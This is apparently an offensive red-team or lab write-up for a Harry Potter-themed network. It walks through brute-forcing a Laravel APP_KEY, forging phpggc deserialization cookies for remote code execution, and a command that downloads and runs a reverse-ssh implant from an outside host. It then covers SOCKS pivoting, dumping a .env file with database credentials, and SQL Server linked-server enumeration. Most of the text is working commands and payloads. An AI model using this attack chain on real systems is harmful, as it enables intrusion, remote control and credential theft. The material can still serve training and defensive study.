# Operation Pensieve Breach - Offensive write-up

# WEB01

## RCE

```bash
$ curl -s http://192.168.1.37:8000 -I | grep -i Cookie

Set-Cookie: XSRF-TOKEN=eyJpdiI6InV1eVF2MnZxTkREdzZGUzNXRnRJcmc9PSIsInZhbHVlIjoiRVEwbWVsWWgyTUpoU21jNUJaY3M0QWhSa0ZqNjlkTUJlOTF2VDBKWUhieGRuY3dhVVZkNzNzMjV3VE0ycUpkck1rNnVnNXN0akcwNWhQL2EwQURPTjQ1QUY3U3p3Yk1rekhWZk1zbUVsOUNLS1AxL2d6V2tDSFpqVnFuc0tra0wiLCJtYWMiOiIzZTJmNjY2YzZjYWY1ZDk3ZjI0NjcyNjI3N2U5Mzc1Y2RmNjBmOTAyMDE0M2E4NWYxNWM2MWI5MmEyN2Y0N2Y4IiwidGFnIjoiIn0%3D; expires=Sun, 23 Nov 2025 00:12:11 GMT; Max-Age=7200; path=/; samesite=lax
Set-Cookie: secretic_session=eyJpdiI6IkU3aGs3aGYyMFBTd3VPcDFqWi9wRkE9PSIsInZhbHVlIjoiKzBQK2kxem41enF0ZDNkOXFZL3FabUhkQlRMajhCUDVzU09PQXVaOVVOUjV3cEs0Mzk1TEoyN3VyM09uZHI1Uytzanp6SWlnYmRKVjF1MlFYTWJEVW9rdDMvZVpOQ0p3eUVXaWhXZ2Y1YWNwV2YyVmphN2hWUHU5WXp3Y0VERUIiLCJtYWMiOiIxNGZkMWZiZTViMzRmOGNmMGI0NWVmMDFhNWQ3MWY0ZjE1ZDAwYmE0ZDUxYThjNGQ2OWU5NGFiMWZlOTQyZmFkIiwidGFnIjoiIn0%3D; expires=Sun, 23 Nov 2025 00:12:11 GMT; Max-Age=7200; path=/; httponly; samesite=lax
Set-Cookie: dwULUYdxyze7n8i8qU5UKE8WnVHoa4mIrYwjwcWo=eyJpdiI6IlE5QlR4WHJXdEYvMDlOMzB3clE4Tnc9PSIsInZhbHVlIjoic1Q5REQva1c0SDVWd1g2RmtlM2JPUU9jdFlGbkZPWURVVkgyRzRXcTRUWC9VZVZtQzBEM3ZmN0QxTFpURTVZTFkvYmZUN2ZJRDBFbm1WR0Yya0dVZEJwT2pTck5qZ3BvUUNNQWtNVHM3QU5LZHZOcEU2TWRrbGdLdXplakVPc0pmbWdVanhiK0JyeFMrRjZyb0dydlJJR015aFNPdUpMSXhLSWZGMWZxRHdCTGo0eTV6YUNoMW5ZTW9wREtUdGNKV2VINXJJTUdEQjhrK0oxMXhpdnM4RFpOdUFSSjhJUERTVk0vYjUwN2czTnVQWHcwazlWVnJ4b3FHVHVoc2JsUVBnN0NYVkRnQmVVaURDeitQeFF6V3c9PSIsIm1hYyI6IjM0MmQ0ODAxMWM4ZjU1Yzg3NzExZTdhNTA2MWQ5MTUwOWQ3NGE0YzIzMWMxODgxODVkYWI0M2VlOWU1YTE2ZjIiLCJ0YWciOiIifQ%3D%3D; expires=Sun, 23 Nov 2025 00:12:11 GMT; Max-Age=7200; path=/; httponly; samesite=lax
```

By default, Laravel encrypts emitted cookies based on the Laravel secret key stored in APP_KEY environment variable.
Retrieving those cookies can then be used to bruteforce the secret key.

```bash
$  python3 laravel_crypto_killer.py bruteforce -v "eyJpdiI6IkU3aGs3aGYyMFBTd3VPcDFqWi9wRkE9PSIsInZhbHVlIjoiKzBQK2kxem41enF0ZDNkOXFZL3FabUhkQlRMajhCUDVzU09PQXVaOVVOUjV3cEs0Mzk1TEoyN3VyM09uZHI1Uytzanp6SWlnYmRKVjF1MlFYTWJEVW9rdDMvZVpOQ0p3eUVXaWhXZ2Y1YWNwV2YyVmphN2hWUHU5WXp3Y0VERUIiLCJtYWMiOiIxNGZkMWZiZTViMzRmOGNmMGI0NWVmMDFhNWQ3MWY0ZjE1ZDAwYmE0ZDUxYThjNGQ2OWU5NGFiMWZlOTQyZmFkIiwidGFnIjoiIn0%3D"

Cipher : eyJpdiI6IkU3aGs3aGYyMFBTd3VPcDFqWi9wRkE9PSIsInZhbHVlIjoiKzBQK2kxem41enF0ZDNkOXFZL3FabUhkQlRMajhCUDVzU09PQXVaOVVOUjV3cEs0Mzk1TEoyN3VyM09uZHI1Uytzanp6SWlnYmRKVjF1MlFYTWJEVW9rdDMvZVpOQ0p3eUVXaWhXZ2Y1YWNwV2YyVmphN2hWUHU5WXp3Y0VERUIiLCJtYWMiOiIxNGZkMWZiZTViMzRmOGNmMGI0NWVmMDFhNWQ3MWY0ZjE1ZDAwYmE0ZDUxYThjNGQ2OWU5NGFiMWZlOTQyZmFkIiwidGFnIjoiIn0%3D
Key : base64:zHJvDAIBtVN83kzkjqUZNv42w9gjd8FZZllqdqn0EBQ=
[*] Unciphered value
9dd1c5c8d2839cda6544587b96d80ebb3a6397b5|dwULUYdxyze7n8i8qU5UKE8WnVHoa4mIrYwjwcWo
```

The tool found in its known secrets that the key `base64:zHJvDAIBtVN83kzkjqUZNv42w9gjd8FZZllqdqn0EBQ=` was used by the application.

```bash
$ python3 laravel_crypto_killer.py decrypt -k base64:zHJvDAIBtVN83kzkjqUZNv42w9gjd8FZZllqdqn0EBQ= -v eyJpdiI6IlE5QlR4WHJXdEYvMDlOMzB3clE4Tnc9PSIsInZhbHVlIjoic1Q5REQva1c0SDVWd1g2RmtlM2JPUU9jdFlGbkZPWURVVkgyRzRXcTRUWC9VZVZtQzBEM3ZmN0QxTFpURTVZTFkvYmZUN2ZJRDBFbm1WR0Yya0dVZEJwT2pTck5qZ3BvUUNNQWtNVHM3QU5LZHZOcEU2TWRrbGdLdXplakVPc0pmbWdVanhiK0JyeFMrRjZyb0dydlJJR015aFNPdUpMSXhLSWZGMWZxRHdCTGo0eTV6YUNoMW5ZTW9wREtUdGNKV2VINXJJTUdEQjhrK0oxMXhpdnM4RFpOdUFSSjhJUERTVk0vYjUwN2czTnVQWHcwazlWVnJ4b3FHVHVoc2JsUVBnN0NYVkRnQmVVaURDeitQeFF6V3c9PSIsIm1hYyI6IjM0MmQ0ODAxMWM4ZjU1Yzg3NzExZTdhNTA2MWQ5MTUwOWQ3NGE0YzIzMWMxODgxODVkYWI0M2VlOWU1YTE2ZjIiLCJ0YWciOiIifQ%3D%3D

[*] Unciphered value
5d4711437c28116d0c311af63207e19023b453c8|{"data":"a:2:{s:6:\"_token\";s:40:\"5ZVYmaFnVKuJJ8F1Ci7gSekaFaD5jUGmSn5NjRe4\";s:6:\"_flash\";a:2:{s:3:\"old\";a:0:{}s:3:\"new\";a:0:{}}}","expires":1763856731}
[*] Base64 encoded unciphered version
b'NWQ0NzExNDM3YzI4MTE2ZDBjMzExYWY2MzIwN2UxOTAyM2I0NTNjOHx7ImRhdGEiOiJhOjI6e3M6NjpcIl90b2tlblwiO3M6NDA6XCI1WlZZbWFGblZLdUpKOEYxQ2k3Z1Nla2FGYUQ1alVHbVNuNU5qUmU0XCI7czo2OlwiX2ZsYXNoXCI7YToyOntzOjM6XCJvbGRcIjthOjA6e31zOjM6XCJuZXdcIjthOjA6e319fSIsImV4cGlyZXMiOjE3NjM4NTY3MzF9BwcHBwcHBw=='
[+] Matched serialized data in results! It's time to exploit unserialization to get RCE mate!
```

This key can now be used to RCE on the application using deserialized cookies.

```bash
$ git clone https://github.com/ambionics/phpggc && cd phpggc && docker build . -t 'phpggc'
$ docker run -t phpggc Laravel/RCE15 'system' 'id' -b

Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086Mjk6IklsbHVtaW5hdGVcUXVldWVcUXVldWVNYW5hZ2VyIjoyOntzOjY6IgAqAGFwcCI7YToxOntzOjY6ImNvbmZpZyI7YToyOntzOjEzOiJxdWV1ZS5kZWZhdWx0IjtzOjM6ImtleSI7czoyMToicXVldWUuY29ubmVjdGlvbnMua2V5IjthOjE6e3M6NjoiZHJpdmVyIjtzOjQ6ImZ1bmMiO319fXM6MTM6IgAqAGNvbm5lY3RvcnMiO2E6MTp7czo0OiJmdW5jIjthOjI6e2k6MDtPOjI4OiJJbGx1bWluYXRlXEF1dGhcUmVxdWVzdEd1YXJkIjozOntzOjExOiIAKgBjYWxsYmFjayI7czoxNDoiY2FsbF91c2VyX2Z1bmMiO3M6MTA6IgAqAHJlcXVlc3QiO3M6Njoic3lzdGVtIjtzOjExOiIAKgBwcm92aWRlciI7czoyOiJpZCI7fWk6MTtzOjQ6InVzZXIiO319fX0=

$ python3 laravel_crypto_killer.py encrypt -k base64:zHJvDAIBtVN83kzkjqUZNv42w9gjd8FZZllqdqn0EBQ= -v Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086Mjk6IklsbHVtaW5hdGVcUXVldWVcUXVldWVNYW5hZ2VyIjoyOntzOjY6IgAqAGFwcCI7YToxOntzOjY6ImNvbmZpZyI7YToyOntzOjEzOiJxdWV1ZS5kZWZhdWx0IjtzOjM6ImtleSI7czoyMToicXVldWUuY29ubmVjdGlvbnMua2V5IjthOjE6e3M6NjoiZHJpdmVyIjtzOjQ6ImZ1bmMiO319fXM6MTM6IgAqAGNvbm5lY3RvcnMiO2E6MTp7czo0OiJmdW5jIjthOjI6e2k6MDtPOjI4OiJJbGx1bWluYXRlXEF1dGhcUmVxdWVzdEd1YXJkIjozOntzOjExOiIAKgBjYWxsYmFjayI7czoxNDoiY2FsbF91c2VyX2Z1bmMiO3M6MTA6IgAqAHJlcXVlc3QiO3M6Njoic3lzdGVtIjtzOjExOiIAKgBwcm92aWRlciI7czoyOiJpZCI7fWk6MTtzOjQ6InVzZXIiO319fX0= -sc=5d4711437c28116d0c311af63207e19023b453c8

[+] Here is your laravel ciphered session cookie, happy hacking mate!
eyJpdiI6ICJzQzhyMTYrWGx0NUJvUTFRYXZVUC93PT0iLCAidmFsdWUiOiAicjAxdDZYV2sxUGpPU21FYldpWnhyMmxqeUVKMS8xeTEybUxBUUZkU0pSNGhiS3gzY1BEdmptNUhJNEkwTWp2eFlXUVdxa1RsY0VrbmN6dGJWVElaazlCRGJzcGJEUVZnZkZmVXEyeWJML3JobnJrTjh1TEROYmQyZW1PSVpyYnNmdjlpcWkwY3g3OS9jdmRGTVl0eGZoRjNJS0hPdXc4cUZJdDA2MXVmakdEUXpSSW96N0d0akwzOVhicUhqb3FFdURJZUNUMUk0azNrM1lDWW01Q2hmNXpEci9sKzRSWHJCUlN2ZGVLU3RNQUtyU00yVUIrZXdIdnZZRCtmR0hPN1pWTDNHMFpTUU45TG9jLzVYc1dOUTl2dkF1dHRsMk9uNTBxSmZQOGQ2KzlES0ZqMTRsQ2Nta0ZvTXFmVldtRkl0UEtSTVBNWlpacmhPSUM3ZE5RMlhTbytWRjAzYlFXenVyOTdESkY4cWNXZHd3QXdtMHRrUnFyVVdjNC94ekMwR3ZUQVk4Z1BEdCtLSFk0ZTZlNUc5MzlvMGlFejBYRE5QS0VDZ0F6OUw2ajRhbXU4aEhHcjBzR3ZiU1VwYzVNSjZiMXJveDZMN2haZVRSdmFEY20wSHFWcjVJTVNSS1dkbFNaM2tEMlZDZ3VHa2RXaEpRWGhPWklXRit1T3lVZVpVaGsvUTNzb3ptNG5SSGpwQmIzb205bFVZaFVFV0xoUG8rdGFYUTdFU0orTFRGVGpaK0NEM1J4ZHZDUEl6Q3A1a2tkbFdPVkwyRVdBZXBoUWdPeWlJaGp0aDdOQWk1UFRaU3NENTl4S0hXeDF3ZFMxZmhYUXgxamdkeE9hTDhQRDYvZzhLV2pONzdxWmViMzhOdUNZbnl4U3IvQnQraXZnR0tjcGtmSC9lZkxNcENoNncwbkFxd3cxRnpzSjlCcFZONXlTYnRsNStEYkNhWHlER01BWCs2RGZZUjhQc1pUVFRtSHdXTlNoKzM0a0V1UllFT0hCSnl3WFVzMTFMakhneWZPdldNOEFNRWhKL2d2eXV4ZDBhZWZQTEJBWU93eDdscWUydVNybkpXMExHOVVUL3ZMZm9neEFRZHcwVEJVRyIsICJtYWMiOiAiNDYzODQ4NmUzMzk5ODdiYmNiMmIzNjM4ZWNiOTkyNjNmZWRkYmEwNzFkZjBlMGVkOTkwYTY0MDAwMGUwNDU1NiIsICJ0YWciOiAiIn0=
```

Now the payload can be send to the target that will unserialize it and execute the command execution.

```bash
$ curl -s -H 'Cookie:secretic_session=eyJpdiI6IkU3aGs3aGYyMFBTd3VPcDFqWi9wRkE9PSIsInZhbHVlIjoiKzBQK2kxem41enF0ZDNkOXFZL3FabUhkQlRMajhCUDVzU09PQXVaOVVOUjV3cEs0Mzk1TEoyN3VyM09uZHI1Uytzanp6SWlnYmRKVjF1MlFYTWJEVW9rdDMvZVpOQ0p3eUVXaWhXZ2Y1YWNwV2YyVmphN2hWUHU5WXp3Y0VERUIiLCJtYWMiOiIxNGZkMWZiZTViMzRmOGNmMGI0NWVmMDFhNWQ3MWY0ZjE1ZDAwYmE0ZDUxYThjNGQ2OWU5NGFiMWZlOTQyZmFkIiwidGFnIjoiIn0%3D; dwULUYdxyze7n8i8qU5UKE8WnVHoa4mIrYwjwcWo=eyJpdiI6ICJzQzhyMTYrWGx0NUJvUTFRYXZVUC93PT0iLCAidmFsdWUiOiAicjAxdDZYV2sxUGpPU21FYldpWnhyMmxqeUVKMS8xeTEybUxBUUZkU0pSNGhiS3gzY1BEdmptNUhJNEkwTWp2eFlXUVdxa1RsY0VrbmN6dGJWVElaazlCRGJzcGJEUVZnZkZmVXEyeWJML3JobnJrTjh1TEROYmQyZW1PSVpyYnNmdjlpcWkwY3g3OS9jdmRGTVl0eGZoRjNJS0hPdXc4cUZJdDA2MXVmakdEUXpSSW96N0d0akwzOVhicUhqb3FFdURJZUNUMUk0azNrM1lDWW01Q2hmNXpEci9sKzRSWHJCUlN2ZGVLU3RNQUtyU00yVUIrZXdIdnZZRCtmR0hPN1pWTDNHMFpTUU45TG9jLzVYc1dOUTl2dkF1dHRsMk9uNTBxSmZQOGQ2KzlES0ZqMTRsQ2Nta0ZvTXFmVldtRkl0UEtSTVBNWlpacmhPSUM3ZE5RMlhTbytWRjAzYlFXenVyOTdESkY4cWNXZHd3QXdtMHRrUnFyVVdjNC94ekMwR3ZUQVk4Z1BEdCtLSFk0ZTZlNUc5MzlvMGlFejBYRE5QS0VDZ0F6OUw2ajRhbXU4aEhHcjBzR3ZiU1VwYzVNSjZiMXJveDZMN2haZVRSdmFEY20wSHFWcjVJTVNSS1dkbFNaM2tEMlZDZ3VHa2RXaEpRWGhPWklXRit1T3lVZVpVaGsvUTNzb3ptNG5SSGpwQmIzb205bFVZaFVFV0xoUG8rdGFYUTdFU0orTFRGVGpaK0NEM1J4ZHZDUEl6Q3A1a2tkbFdPVkwyRVdBZXBoUWdPeWlJaGp0aDdOQWk1UFRaU3NENTl4S0hXeDF3ZFMxZmhYUXgxamdkeE9hTDhQRDYvZzhLV2pONzdxWmViMzhOdUNZbnl4U3IvQnQraXZnR0tjcGtmSC9lZkxNcENoNncwbkFxd3cxRnpzSjlCcFZONXlTYnRsNStEYkNhWHlER01BWCs2RGZZUjhQc1pUVFRtSHdXTlNoKzM0a0V1UllFT0hCSnl3WFVzMTFMakhneWZPdldNOEFNRWhKL2d2eXV4ZDBhZWZQTEJBWU93eDdscWUydVNybkpXMExHOVVUL3ZMZm9neEFRZHcwVEJVRyIsICJtYWMiOiAiNDYzODQ4NmUzMzk5ODdiYmNiMmIzNjM4ZWNiOTkyNjNmZWRkYmEwNzFkZjBlMGVkOTkwYTY0MDAwMGUwNDU1NiIsICJ0YWciOiAiIn0=' http://192.168.1.37:8000/ | head -n1

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Post-Exploitation

### Pivot

In order to pivot to the internal network, a network implant has to be created.
To do so, `reverse-ssh` will be used.
First, install pre-requisite.

```bash
$ sudo apt install -y upx-ucl
$ wget https://go.dev/dl/go1.22.1.linux-amd64.tar.gz
$ sudo rm -rf /usr/local/go; sudo tar -C /usr/local -xzf go1.22.1.linux-amd64.tar.gz
$ sudo ln -s /usr/local/go/bin/go ~/.local/bin
$ go install golang.org/dl/go1.15@latest
$ ~/go/bin/go1.15 download
```

Then download and compile binaries.

```bash
$ git clone https://github.com/Fahrj/reverse-ssh
$ cd reverse-ssh
$ sed -i 's#go build#~/go/bin/go1.15 build#g' Makefile
$ RS_PASS="?8@XdCNymdoH5CkgigiL" LHOST="51.75.120.170" LPORT="53" make compressed
```

Using the RCE, download and execute the network implant.

```bash
$ docker run -t phpggc Laravel/RCE15 'system' 'curl -k https://xthaz.fr/kinit -o /dev/shm/kinit && chmod +x /dev/shm/kinit && /dev/shm/kinit & disown' -b
Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086Mjk6IklsbHVtaW5hdGVcUXVldWVcUXVldWVNYW5hZ2VyIjoyOntzOjY6IgAqAGFwcCI7YToxOntzOjY6ImNvbmZpZyI7YToyOntzOjEzOiJxdWV1ZS5kZWZhdWx0IjtzOjM6ImtleSI7czoyMToicXVldWUuY29ubmVjdGlvbnMua2V5IjthOjE6e3M6NjoiZHJpdmVyIjtzOjQ6ImZ1bmMiO319fXM6MTM6IgAqAGNvbm5lY3RvcnMiO2E6MTp7czo0OiJmdW5jIjthOjI6e2k6MDtPOjI4OiJJbGx1bWluYXRlXEF1dGhcUmVxdWVzdEd1YXJkIjozOntzOjExOiIAKgBjYWxsYmFjayI7czoxNDoiY2FsbF91c2VyX2Z1bmMiO3M6MTA6IgAqAHJlcXVlc3QiO3M6Njoic3lzdGVtIjtzOjExOiIAKgBwcm92aWRlciI7czoxMDI6ImN1cmwgLWsgaHR0cHM6Ly94dGhhei5mci9raW5pdCAtbyAvZGV2L3NobS9raW5pdCAmJiBjaG1vZCAreCAvZGV2L3NobS9raW5pdCAmJiAvZGV2L3NobS9raW5pdCAmIGRpc293biI7fWk6MTtzOjQ6InVzZXIiO319fX0=

$ python3 laravel_crypto_killer.py encrypt -k base64:zHJvDAIBtVN83kzkjqUZNv42w9gjd8FZZllqdqn0EBQ= -v Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086Mjk6IklsbHVtaW5hdGVcUXVldWVcUXVldWVNYW5hZ2VyIjoyOntzOjY6IgAqAGFwcCI7YToxOntzOjY6ImNvbmZpZyI7YToyOntzOjEzOiJxdWV1ZS5kZWZhdWx0IjtzOjM6ImtleSI7czoyMToicXVldWUuY29ubmVjdGlvbnMua2V5IjthOjE6e3M6NjoiZHJpdmVyIjtzOjQ6ImZ1bmMiO319fXM6MTM6IgAqAGNvbm5lY3RvcnMiO2E6MTp7czo0OiJmdW5jIjthOjI6e2k6MDtPOjI4OiJJbGx1bWluYXRlXEF1dGhcUmVxdWVzdEd1YXJkIjozOntzOjExOiIAKgBjYWxsYmFjayI7czoxNDoiY2FsbF91c2VyX2Z1bmMiO3M6MTA6IgAqAHJlcXVlc3QiO3M6Njoic3lzdGVtIjtzOjExOiIAKgBwcm92aWRlciI7czoxMDI6ImN1cmwgLWsgaHR0cHM6Ly94dGhhei5mci9raW5pdCAtbyAvZGV2L3NobS9raW5pdCAmJiBjaG1vZCAreCAvZGV2L3NobS9raW5pdCAmJiAvZGV2L3NobS9raW5pdCAmIGRpc293biI7fWk6MTtzOjQ6InVzZXIiO319fX0= -sc=5d4711437c28116d0c311af63207e19023b453c8

[+] Here is your laravel ciphered session cookie, happy hacking mate!
eyJpdiI6ICJFNzJQWWdpUE9OcE81S3lIYmdISXRRPT0iLCAidmFsdWUiOiAiamxjWkpkckZDRHBaZXl6TFR5ZzJnSTRWY3ZDVGhyc3JVVjUxMTBsK1hIMVdRbmsvbVFEVjd1TFBuZ0c0c1VxNU84czFMd2hFZGV4MDduTytxOXJlSENDWmpOeFdyelIwN1NKS3BNQnFWZXZlc1NYeFlLemxOcVlKeHZOQmZKby9jTzBheGZaWHRBSGw5WWNoUmIxSEtYRDNpTEg1Y1l1M3IxRGdHZTFkaVBnY3hSenEzVjA4ZGVBL3hFUU56bS9sd2l2d0FHMG9zaTd0N0FCcHhpWjhkQVAxclZjRER4NW92SmllYU03VVliSXZLTjVGRWRFb1dZbHdGaWJBM1c2NENUcHBGSjNHeUF2aWdXdSs2b2M5d3djWHJ3T3c4RUp6SmlxZ2NhRkI4YXhFNmQ0Tk9pKzdCZU5zdUp3b2RRNkRzQ1c2TE9KSUpvYXU5Q2plUm5kKzJFSUtxWDNvTmpsMWw4YlVjZHFDNVp6eFFiZm90cWU4TjhybCtRaUdpemdVTWhuTDM5VjBsazRVRGcxdFhFTXVDeHdTT0VkZW1ndHpITXBCb0tSelM0RGlnc2dPanYyMC9TL1M1djNZcFdlc1dzWW5QYmRGOWRXeHhDaDNMdFNBVGxIWGV4ZnNnQUdka20yRDY2b2tSMEJTQmNvUllMTWthSHdRN09aVWo2YVJJVXRFMjJ1S1A3RytiWjEyNU9aYWdsSjFmTHFIT0tSbHVJaWJwaUJJWjEyRUFZcFJvbmlrN2tqNUgvcEoreHdUY3pPTi8zYVB0dG41MjljS3pJWktRV0NRdUJMUHpXcnNhUUZLbUU5M3lrc2RTUHgzQXd5cjhFcUNoMk1aWEhPOEEwNVFQUXo1K0l4RU00VlpxZ1lvaWFIMHByYmlPZlVVSjFLVmpzekhRYkMrTUlrTDJMK1pkZlVMQWpiS0RRb2dJMUd2MnJWQU56eEU2ajhhZUE2L1l2UWdVZW1lWFpuSzZCYTkxV09MUzA2VVN3bUs4dzJqb3R5TVZ6ejdWR1hsMkVaTEMwNEU1VEJRMmhMOTVqQm1xV2h5YkpzbThMZWdadW5YcS9CNkROT1VZTjFLYXBQb0ZzVFJtVTloR2ZzS21lNnE2QlhkWloxTVhMUDRDeW1DbTFDb01JR29ZWFBISURSNnBLQVhmTjdrTEY1WkN4V1RRSkJDU0E4eWlTS1p1MFNaTytwN2pLbDN6aTZaZDBrZmkySzBxeEZjUFhoaHdiZ0NQUzltVklINUd4TlB6WEJVZjlQb3hoLzJWS1BxYjFWNjBueE04TjRXVFMzdk8yS01HUT09IiwgIm1hYyI6ICJjZDZhOWIwM2YxMTBjYjEyYzdlNGRkNDk1OTNmNGU0YTMxZDhmNjZjMGExMmYxZDg3MmU3ZjA0NzEyZjk2ZmMwIiwgInRhZyI6ICIifQ==
```

Finaly request the endpoint with payload inserted inside the cookie.

```bash
$ sudo setcap 'cap_net_bind_service=+ep' ./reverse-ssh
$ curl -s -H 'Cookie:secretic_session=eyJpdiI6IkU3aGs3aGYyMFBTd3VPcDFqWi9wRkE9PSIsInZhbHVlIjoiKzBQK2kxem41enF0ZDNkOXFZL3FabUhkQlRMajhCUDVzU09PQXVaOVVOUjV3cEs0Mzk1TEoyN3VyM09uZHI1Uytzanp6SWlnYmRKVjF1MlFYTWJEVW9rdDMvZVpOQ0p3eUVXaWhXZ2Y1YWNwV2YyVmphN2hWUHU5WXp3Y0VERUIiLCJtYWMiOiIxNGZkMWZiZTViMzRmOGNmMGI0NWVmMDFhNWQ3MWY0ZjE1ZDAwYmE0ZDUxYThjNGQ2OWU5NGFiMWZlOTQyZmFkIiwidGFnIjoiIn0%3D; dwULUYdxyze7n8i8qU5UKE8WnVHoa4mIrYwjwcWo=eyJpdiI6ICJFNzJQWWdpUE9OcE81S3lIYmdISXRRPT0iLCAidmFsdWUiOiAiamxjWkpkckZDRHBaZXl6TFR5ZzJnSTRWY3ZDVGhyc3JVVjUxMTBsK1hIMVdRbmsvbVFEVjd1TFBuZ0c0c1VxNU84czFMd2hFZGV4MDduTytxOXJlSENDWmpOeFdyelIwN1NKS3BNQnFWZXZlc1NYeFlLemxOcVlKeHZOQmZKby9jTzBheGZaWHRBSGw5WWNoUmIxSEtYRDNpTEg1Y1l1M3IxRGdHZTFkaVBnY3hSenEzVjA4ZGVBL3hFUU56bS9sd2l2d0FHMG9zaTd0N0FCcHhpWjhkQVAxclZjRER4NW92SmllYU03VVliSXZLTjVGRWRFb1dZbHdGaWJBM1c2NENUcHBGSjNHeUF2aWdXdSs2b2M5d3djWHJ3T3c4RUp6SmlxZ2NhRkI4YXhFNmQ0Tk9pKzdCZU5zdUp3b2RRNkRzQ1c2TE9KSUpvYXU5Q2plUm5kKzJFSUtxWDNvTmpsMWw4YlVjZHFDNVp6eFFiZm90cWU4TjhybCtRaUdpemdVTWhuTDM5VjBsazRVRGcxdFhFTXVDeHdTT0VkZW1ndHpITXBCb0tSelM0RGlnc2dPanYyMC9TL1M1djNZcFdlc1dzWW5QYmRGOWRXeHhDaDNMdFNBVGxIWGV4ZnNnQUdka20yRDY2b2tSMEJTQmNvUllMTWthSHdRN09aVWo2YVJJVXRFMjJ1S1A3RytiWjEyNU9aYWdsSjFmTHFIT0tSbHVJaWJwaUJJWjEyRUFZcFJvbmlrN2tqNUgvcEoreHdUY3pPTi8zYVB0dG41MjljS3pJWktRV0NRdUJMUHpXcnNhUUZLbUU5M3lrc2RTUHgzQXd5cjhFcUNoMk1aWEhPOEEwNVFQUXo1K0l4RU00VlpxZ1lvaWFIMHByYmlPZlVVSjFLVmpzekhRYkMrTUlrTDJMK1pkZlVMQWpiS0RRb2dJMUd2MnJWQU56eEU2ajhhZUE2L1l2UWdVZW1lWFpuSzZCYTkxV09MUzA2VVN3bUs4dzJqb3R5TVZ6ejdWR1hsMkVaTEMwNEU1VEJRMmhMOTVqQm1xV2h5YkpzbThMZWdadW5YcS9CNkROT1VZTjFLYXBQb0ZzVFJtVTloR2ZzS21lNnE2QlhkWloxTVhMUDRDeW1DbTFDb01JR29ZWFBISURSNnBLQVhmTjdrTEY1WkN4V1RRSkJDU0E4eWlTS1p1MFNaTytwN2pLbDN6aTZaZDBrZmkySzBxeEZjUFhoaHdiZ0NQUzltVklINUd4TlB6WEJVZjlQb3hoLzJWS1BxYjFWNjBueE04TjRXVFMzdk8yS01HUT09IiwgIm1hYyI6ICJjZDZhOWIwM2YxMTBjYjEyYzdlNGRkNDk1OTNmNGU0YTMxZDhmNjZjMGExMmYxZDg3MmU3ZjA0NzEyZjk2ZmMwIiwgInRhZyI6ICIifQ==' http://192.168.1.37:8000/ | head -n1
$ ./reverse-ssh -v -l -p 53
2025/11/22 22:09:43 Starting ssh server on :53
2025/11/22 22:09:43 Success: listening on [::]:53
2025/11/22 22:23:09 Successful authentication with password from reverse@xx.xx.xx.xx:63949
2025/11/22 22:23:09 Attempt to bind at 127.0.0.1:8888 granted
2025/11/22 22:23:09 New connection from xx.xx.xx.xx:63949: www-data on spellbook01 reachable via 127.0.0.1:8888
```

The pivot worked successfuly !
Now dynamic SOCKS will be use to reach internal network.

```bash
$ sshpass -p '?8@XdCNymdoH5CkgigiL' ssh 127.0.0.1 -p 8888 -T -C -D 1081 -Nq
```

### Looting secrets

```bash
$ sshpass -p '?8@XdCNymdoH5CkgigiL' ssh 127.0.0.1 -p 8888 -T -C 'ls -al /var/www'
drwxr-xr-x  3 root     root     4096 Nov 22 19:47 .
drwxr-xr-x 12 root     root     4096 Nov 22 19:47 ..
drwxr-xr-x 17 www-data www-data 4096 Nov 22 19:54 secretnotes

$ sshpass -p '?8@XdCNymdoH5CkgigiL' ssh 127.0.0.1 -p 8888 -T -C 'ls -al /var/www/secretnotes'

drwxr-xr-x 17 www-data www-data   4096 Nov 22 19:54 .
drwxr-xr-x  3 root     root       4096 Nov 22 19:47 ..
-rw-r--r--  1 www-data www-data    258 Nov 22 19:47 .editorconfig
-rw-r--r--  1 www-data www-data   1040 Nov 22 19:54 .env
-rw-r--r--  1 www-data www-data   1004 Nov 22 19:47 .env.ci
-rw-r--r--  1 www-data www-data   1011 Nov 22 19:47 .env.local
drwxr-xr-x  8 www-data www-data   4096 Nov 22 22:15 .git
-rw-r--r--  1 www-data www-data    152 Nov 22 19:47 .gitattributes
drwxr-xr-x  3 www-data www-data   4096 Nov 22 19:47 .github
drwxr-xr-x  9 www-data www-data   4096 Nov 22 19:47 app
-rwxr-xr-x  1 www-data www-data   1686 Nov 22 19:47 artisan
drwxr-xr-x  4 www-data www-data   4096 Nov 22 19:47 assets
drwxr-xr-x  2 www-data www-data   4096 Nov 22 19:54 config
drwxr-xr-x  5 www-data www-data   4096 Nov 22 19:47 database

$ sshpass -p '?8@XdCNymdoH5CkgigiL' ssh 127.0.0.1 -p 8888 -T -C 'cat /var/www/secretnotes/.env'
APP_NAME=Secretic
APP_ENV=local
APP_KEY=base64:zHJvDAIBtVN83kzkjqUZNv42w9gjd8FZZllqdqn0EBQ=
APP_DEBUG=true
APP_URL=http://localhost:8000

LOG_CHANNEL=stack
LOG_DEPRECATIONS_CHANNEL=null
LOG_LEVEL=debug

DB_CONNECTION=sqlsrv
DB_HOST=192.168.56.102
DB_PORT=1433
DB_DATABASE=spellbook
DB_USERNAME=spellbook
DB_PASSWORD='Alohomora!Forbidden#713'
```

Found some database credentials, let's try to use it to continue the intrusion.

# SQL02

## Trusted link to SQL01

Using database credentials, one can authenticate to the targeted database and perform enumeration.

```bash
$ pc -q mssqlclient.py 'spellbook':'Alohomora!Forbidden#713'@'192.168.56.102'
SQL (spellbook  spellbook@spellbook)> enum_links
SRV_NAME                 SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE               SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT
----------------------   ----------------   -----------   --------------------------   ------------------   ------------   -------
gringotts01              SQLNCLI                          gringotts01.hogwarts.local   NULL                 NULL           NULL

GRINGOTTS02\SQLEXPRESS   SQLNCLI            SQL Server    GRINGOTTS02\SQLEXPRESS       NULL                 NULL           NULL

